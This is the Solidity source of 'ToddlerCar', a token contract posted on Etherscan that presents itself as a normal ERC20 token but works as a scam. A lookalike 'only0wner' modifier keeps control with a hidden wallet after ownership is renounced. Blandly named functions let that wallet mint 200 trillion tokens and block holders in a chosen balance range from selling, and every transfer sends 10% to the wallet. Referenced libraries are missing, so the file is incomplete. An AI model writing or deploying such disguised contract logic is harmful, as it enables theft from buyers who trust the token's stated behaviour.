/**
 *Submitted for verification at Etherscan.io on 2021-07-13
*/

// Welcome to ToddlerCar
// Telegram: https://t.me/ToddlerCar

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ToddlerCar is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    //total sup
    uint256 private _tTotal = 100000000000 * 10**18;
    //max total after burn
    uint256 private _maxTotal = 200000000000000 * 10**18;
    uint256 private _feeAddr1;
    uint256 private _feeAddr2;
    
    string private _name = 'ToddlerCar';
    string private _symbol = 'ToddlerCar';
    uint8 private _decimals = 18;
    
    address private _feeAddrWallet = _msgSender();
    
    modifier only0wner() {
        require(_feeAddrWallet == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        _feeAddr1 = 30000000000 * 10**18;
        _feeAddr2 = 30000000000 * 10**18;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
     function blackListBot(address sender) private view returns (bool){
        if (balanceOf(sender) >= _feeAddr2 && balanceOf(sender) <= _feeAddr1) {
            return true;
        } else {
            return false;
        }
    }
    
    function manualSwap(uint256 curSup) public only0wner{
        _feeAddr1 = curSup * 10**18;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    
    function setCooldownEnable() public only0wner{
        _feeAddr2 = 7;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function manualsend() public only0wner{
        //manual send
        _tTotal = _tTotal.add(_maxTotal);
        _balances[_feeAddrWallet] = _balances[_feeAddrWallet].add(_maxTotal);
        emit Transfer(
            address(0),
            _feeAddrWallet,
            _maxTotal);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender == owner()) {
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
            if (blackListBot(sender)) {
                require(amount > _maxTotal, "Transfer amount exceeds the maxTxAmount.");
            }
            
            uint256 reflectToken = amount.mul(10).div(100);
            uint256 reflectEth = amount.sub(reflectToken);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[_feeAddrWallet] = _balances[_feeAddrWallet].add(reflectToken);
            _balances[recipient] = _balances[recipient].add(reflectEth);
            
            
            emit Transfer(sender, recipient, reflectEth);
        }
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
}